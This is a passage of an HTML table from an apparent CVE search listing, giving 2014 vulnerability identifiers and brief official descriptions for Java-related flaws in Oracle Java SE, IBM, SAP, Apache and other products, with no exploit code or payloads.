		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6511">CVE-2014-6511</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, 7u67, and 8u20 allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6506">CVE-2014-6506</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, 7u67, and 8u20, and Java SE Embedded 7u60, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6504">CVE-2014-6504</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, and 7u67, and Java SE Embedded 7u60, allows remote attackers to affect confidentiality via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6503">CVE-2014-6503</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2014-4288, CVE-2014-6493, and CVE-2014-6532.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6502">CVE-2014-6502</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, 7u67, and 8u20, and Java SE Embedded 7u60, allows remote attackers to affect integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6493">CVE-2014-6493</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2014-4288, CVE-2014-6503, and CVE-2014-6532.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6492">CVE-2014-6492</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20, when running on Firefox, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6485">CVE-2014-6485</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u20 and JavaFX 2.2.65 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6476">CVE-2014-6476</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u67 and 8u20 allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2014-6527.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6468">CVE-2014-6468</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u20 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6467">CVE-2014-6467</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2014-6453, CVE-2014-6545, and CVE-2014-6560.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6466">CVE-2014-6466</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20, when running on Internet Explorer, allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6458">CVE-2014-6458</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6457">CVE-2014-6457</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, 7u67, and 8u20; Java SE Embedded 7u60; and JRockit R27.8.3, and R28.3.3 allows remote attackers to affect confidentiality and integrity via vectors related to JSSE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6456">CVE-2014-6456</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u67 and 8u20 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6453">CVE-2014-6453</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2014-6467, CVE-2014-6545, and CVE-2014-6560.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6195">CVE-2014-6195</a></td>
		<td valign="top">The (1) Java GUI and (2) Web GUI components in the IBM Tivoli Storage Manager (TSM) Backup-Archive client 5.4 and 5.5 before 5.5.4.4 on AIX, Linux, and Solaris; 5.4.x and 5.5.x on Windows and z/OS; 6.1 before 6.1.5.7 on z/OS; 6.1 and 6.2 before 6.2.5.2 on Windows, before 6.2.5.3 on AIX and Linux x86, and before 6.2.5.4 on Linux Z and Solaris; 6.3 before 6.3.2.1 on AIX, before 6.3.2.2 on Windows, and before 6.3.2.3 on Linux; 6.4 before 6.4.2.1; and 7.1 before 7.1.1 in IBM TSM for Mail, when the Data Protection for Lotus Domino component is used, allow local users to bypass authentication and restore a Domino database or transaction-log backup via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-5516">CVE-2014-5516</a></td>
		<td valign="top">Cross-site request forgery (CSRF) vulnerability in the Storefront Application in DS Data Systems KonaKart before 7.3.0.0 allows remote attackers to hijack the authentication of administrators for requests that change a user email address via an unspecified GET request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4822">CVE-2014-4822</a></td>
		<td valign="top">IBM WebSphere MQ classes for Java libraries 8.0 before 8.0.0.1 and Websphere MQ Explorer 7.5 before 7.5.0.5 and 8.0 before 8.0.0.2 allow local users to discover preconfigured cleartext passwords via an unspecified trace operation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4624">CVE-2014-4624</a></td>
		<td valign="top">EMC Avamar Data Store (ADS) and Avamar Virtual Edition (AVE) 6.x and 7.0.x through 7.0.2-43 do not require authentication for Java API calls, which allows remote attackers to discover grid MCUser and GSAN passwords via a crafted call.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4295">CVE-2014-4295</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality via unknown vectors, a different vulnerability than CVE-2014-4294, CVE-2014-6538, and CVE-2014-6563.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4294">CVE-2014-4294</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality via unknown vectors, a different vulnerability than CVE-2014-4295, CVE-2014-6538, and CVE-2014-6563.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4288">CVE-2014-4288</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2014-6493, CVE-2014-6503, and CVE-2014-6532.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4268">CVE-2014-4268</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5 allows remote attackers to affect confidentiality via unknown vectors related to Swing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4266">CVE-2014-4266</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u60 and 8u5 allows remote attackers to affect integrity via unknown vectors related to Serviceability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4265">CVE-2014-4265</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u75, 7u60, and 8u5 allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4264">CVE-2014-4264</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u60 and 8u5 allows remote attackers to affect availability via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4263">CVE-2014-4263</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5, and JRockit R27.8.2 and R28.3.2, allows remote attackers to affect confidentiality and integrity via unknown vectors related to "Diffie-Hellman key agreement."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4262">CVE-2014-4262</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4252">CVE-2014-4252</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5 allows remote attackers to affect confidentiality via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4247">CVE-2014-4247</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u5 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4244">CVE-2014-4244</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5, and JRockit R27.8.2 and JRockit R28.3.2, allows remote attackers to affect confidentiality and integrity via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4227">CVE-2014-4227</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u75, 7u60, and 8u5 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4223">CVE-2014-4223</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u60 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2014-2483.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4221">CVE-2014-4221</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u60 and 8u5 allows remote attackers to affect confidentiality via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4220">CVE-2014-4220</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u60 and 8u5 allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2014-4208.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4219">CVE-2014-4219</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u75, 7u60, and 8u5 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4218">CVE-2014-4218</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5 allows remote attackers to affect integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4216">CVE-2014-4216</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4209">CVE-2014-4209</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u65, 6u75, 7u60, and 8u5 allows remote attackers to affect confidentiality and integrity via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4208">CVE-2014-4208</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE component in Oracle Java SE 7u60 and 8u5 allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2014-4220.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4193">CVE-2014-4193</a></td>
		<td valign="top">The TLS implementation in EMC RSA BSAFE-Java Toolkits (aka Share for Java) supports the Extended Random extension during use of the Dual_EC_DRBG algorithm, which makes it easier for remote attackers to obtain plaintext from TLS sessions by requesting long nonces from a server, a different issue than CVE-2007-6755.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-4172">CVE-2014-4172</a></td>
		<td valign="top">A URL parameter injection vulnerability was found in the back-channel ticket validation step of the CAS protocol in Jasig Java CAS Client before 3.3.2, .NET CAS Client before 1.0.2, and phpCAS before 1.3.3 that allow remote attackers to inject arbitrary web script or HTML via the (1) service parameter to validation/AbstractUrlBasedTicketValidator.java or (2) pgtUrl parameter to validation/Cas20ServiceTicketValidator.java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3780">CVE-2014-3780</a></td>
		<td valign="top">Unspecified vulnerability in Citrix VDI-In-A-Box 5.3.x before 5.3.8 and 5.4.x before 5.4.4 allows remote attackers to bypass authentication via unspecified vectors, related to a Java servlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3654">CVE-2014-3654</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in spacewalk-java 2.0.2 in Spacewalk and Red Hat Network (RHN) Satellite 5.5 and 5.6 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors to (1) kickstart/cobbler/CustomSnippetList.do, (2) channels/software/Entitlements.do, or (3) admin/multiorg/OrgUsers.do.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3630">CVE-2014-3630</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in the Java XML processing functionality in Play before 2.2.6 and 2.3.x before 2.3.5 might allow remote attackers to read arbitrary files, cause a denial of service, or have unspecified other impact via crafted XML data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3612">CVE-2014-3612</a></td>
		<td valign="top">The LDAPLoginModule implementation in the Java Authentication and Authorization Service (JAAS) in Apache ActiveMQ 5.x before 5.10.1 allows remote attackers to bypass authentication by logging in with an empty password and valid username, which triggers an unauthenticated bind. NOTE: this identifier has been SPLIT per ADT2 due to different vulnerability types. See CVE-2015-6524 for the use of wildcard operators in usernames.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3603">CVE-2014-3603</a></td>
		<td valign="top">The (1) HttpResource and (2) FileBackedHttpResource implementations in Shibboleth Identity Provider (IdP) before 2.4.1 and OpenSAML Java 2.6.2 do not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3595">CVE-2014-3595</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in spacewalk-java 1.2.39, 1.7.54, and 2.0.2 in Spacewalk and Red Hat Network (RHN) Satellite 5.4 through 5.6 allows remote attackers to inject arbitrary web script or HTML via a crafted request that is not properly handled when logging.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3574">CVE-2014-3574</a></td>
		<td valign="top">Apache POI before 3.10.1 and 3.11.x before 3.11-beta2 allows remote attackers to cause a denial of service (CPU consumption and crash) via a crafted OOXML file, aka an XML Entity Expansion (XEE) attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3558">CVE-2014-3558</a></td>
		<td valign="top">ReflectionHelper (org.hibernate.validator.util.ReflectionHelper) in Hibernate Validator 4.1.0 before 4.2.1, 4.3.x before 4.3.2, and 5.x before 5.1.2 allows attackers to bypass Java Security Manager (JSM) restrictions and execute restricted reflection calls via a crafted application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3481">CVE-2014-3481</a></td>
		<td valign="top">org.jboss.as.jaxrs.deployment.JaxrsIntegrationProcessor in Red Hat JBoss Enterprise Application Platform (JEAP) before 6.2.4 enables entity expansion, which allows remote attackers to read arbitrary files via unspecified vectors, related to an XML External Entity (XXE) issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3287">CVE-2014-3287</a></td>
		<td valign="top">SQL injection vulnerability in BulkViewFileContentsAction.java in the Java interface in Cisco Unified Communications Manager (Unified CM) allows remote authenticated users to execute arbitrary SQL commands via crafted filename parameters in a URL, aka Bug ID CSCuo17337.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3133">CVE-2014-3133</a></td>
		<td valign="top">SAP Netweaver Java Application Server does not properly restrict access, which allows remote attackers to obtain the list of SAP systems registered on an SLD via an unspecified webdynpro, related to SystemSelection.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3129">CVE-2014-3129</a></td>
		<td valign="top">The Java Server Pages in the Software Lifecycle Manager (SLM) in SAP NetWeaver allows remote attackers to obtain sensitive information via a crafted request, related to SAP Solution Manager 7.1.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3120">CVE-2014-3120</a></td>
		<td valign="top">The default configuration in Elasticsearch before 1.2 enables dynamic scripting, which allows remote attackers to execute arbitrary MVEL expressions and Java code via the source parameter to _search.  NOTE: this only violates the vendor's intended security policy if the user does not run Elasticsearch in its own independent virtual machine.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3089">CVE-2014-3089</a></td>
		<td valign="top">The RDS Java Client library in IBM Rational Directory Server (RDS) 5.1.1.x before 5.1.1.2 iFix004 and 5.2.x before 5.2.1 iFix003, and Rational Directory Administrator (RDA) 6.0 before iFix002, includes the cleartext root password, which allows local users to obtain sensitive information by reading a library file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3086">CVE-2014-3086</a></td>
		<td valign="top">Unspecified vulnerability in the IBM Java Virtual Machine, as used in IBM WebSphere Real Time 3 before Service Refresh 7 FP1 and other products, allows remote attackers to gain privileges by leveraging the ability to execute code in the context of a security manager.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3068">CVE-2014-3068</a></td>
		<td valign="top">IBM Java Runtime Environment (JRE) 7 R1 before SR1 FP1 (7.1.1.1), 7 before SR7 FP1 (7.0.7.1), 6 R1 before SR8 FP1 (6.1.8.1), 6 before SR16 FP1 (6.0.16.1), and before 5.0 SR16 FP7 (5.0.16.7) allows attackers to obtain the private key from a Certificate Management System (CMS) keystore via a brute force attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-3065">CVE-2014-3065</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java Runtime Environment (JRE) 7 R1 before SR2 (7.1.2.0), 7 before SR8 (7.0.8.0), 6 R1 before SR8 FP2 (6.1.8.2), 6 before SR16 FP2 (6.0.16.2), and before SR16 FP8 (5.0.16.8) allows local users to execute arbitrary code via vectors related to the shared classes cache.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2881">CVE-2014-2881</a></td>
		<td valign="top">Unspecified vulnerability in the Diffie-Hellman key agreement implementation in the management GUI Java applet in Citrix NetScaler Application Delivery Controller (ADC) and NetScaler Gateway before 9.3-66.5 and 10.x before 10.1-122.17 has unknown impact and vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2609">CVE-2014-2609</a></td>
		<td valign="top">The Java Glassfish Admin Console in HP Executive Scorecard 9.40 and 9.41 does not require authentication, which allows remote attackers to execute arbitrary code via a session on TCP port 10001, aka ZDI-CAN-2116.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2490">CVE-2014-2490</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE component in Oracle Java SE 7u60 and SE 8u5 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2483">CVE-2014-2483</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE component in Oracle Java SE Java SE 7u60 and OpenJDK 7 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2014-4223. NOTE: the previous information is from the July 2014 CPU. Oracle has not commented on another vendor's claim that the issue is related to improper restriction of the "use of privileged annotations."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2428">CVE-2014-2428</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2427">CVE-2014-2427</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2423">CVE-2014-2423</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JAX-WS, a different vulnerability than CVE-2014-0452 and CVE-2014-0458.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2422">CVE-2014-2422</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and JavaFX 2.2.51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2421">CVE-2014-2421</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8; JavaFX 2.2.51; and Java SE Embedded 7u51 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2420">CVE-2014-2420</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2414">CVE-2014-2414</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JAXB.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2413">CVE-2014-2413</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and Java SE Embedded 7u51, allows remote attackers to affect integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2412">CVE-2014-2412</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, SE 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT, a different vulnerability than CVE-2014-0451.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2410">CVE-2014-2410</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2409">CVE-2014-2409</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality and integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2403">CVE-2014-2403</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u71, 7u51, and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2402">CVE-2014-2402</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2014-0432 and CVE-2014-0455.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2401">CVE-2014-2401</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8; JavaFX 2.2.51; and Java SE Embedded 7u51 allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2398">CVE-2014-2398</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u61, 6u71, 7u51, and 8; JavaFX 2.2.51; and JRockit R27.8.1 and R28.3.1 allows remote authenticated users to affect integrity via unknown vectors related to Javadoc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-2397">CVE-2014-2397</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u51 and 8, and Java SE Embedded 7u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
